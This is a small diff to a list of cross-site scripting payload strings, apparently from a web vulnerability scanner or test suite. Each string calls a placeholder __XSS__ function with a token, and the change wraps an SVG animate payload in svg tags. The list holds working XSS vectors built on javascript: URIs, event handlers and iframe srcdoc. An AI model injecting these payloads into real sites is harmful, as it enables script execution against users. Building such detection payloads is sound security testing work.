@@ -20,7 +20,7 @@
   "<object data=javascript:__XSS__('{{TOKEN}}')>",
   "<embed src=javascript:__XSS__('{{TOKEN}}')>",
   "<xss id=x onfocus=__XSS__('{{TOKEN}}') autofocus>",
-  "<animate onbegin=__XSS__('{{TOKEN}}') attributeName=x>",
+  "<svg><animate onbegin=__XSS__('{{TOKEN}}') attributeName=x></svg>",
   "<svg><animate xlink:href=#x attributeName=href values=javascript:__XSS__('{{TOKEN}}') /><a id=x><rect width=100 height=100 /></a></svg>",
   "<iframe srcdoc=\"&lt;script&gt;parent.__XSS__('{{TOKEN}}')&lt;/script&gt;\">",
   "<math href=\"javascript:__XSS__('{{TOKEN}}')\">XSS</math>",
